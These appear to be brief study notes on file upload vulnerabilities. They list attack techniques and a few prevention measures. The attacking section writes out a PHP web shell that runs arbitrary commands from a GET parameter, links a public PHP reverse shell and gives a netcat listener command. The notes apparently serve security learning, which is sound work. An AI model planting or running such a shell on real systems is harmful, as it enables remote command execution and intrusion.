# Upload Vulnerabilities

## Attacking

- Overwriting existing files on a server
  - Overwrite the same file name on the src path
- Uploading and Executing Shells on a server
  - Webshells
  ```php
  <?php
    echo system($_GET["cmd"]);
  ?>
  ```
  - Reverse/bind shells
    - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    - `nc -lvpn 1234`
- Bypassing Client-Side filtering
- Bypassing various kinds of Server-Side filtering
- Fooling content type validation checks

## Prevention 

- Assign the file with a new name or random or date and time
- Check filename already exists on the server
- File permission to protect existing files from being overwritten
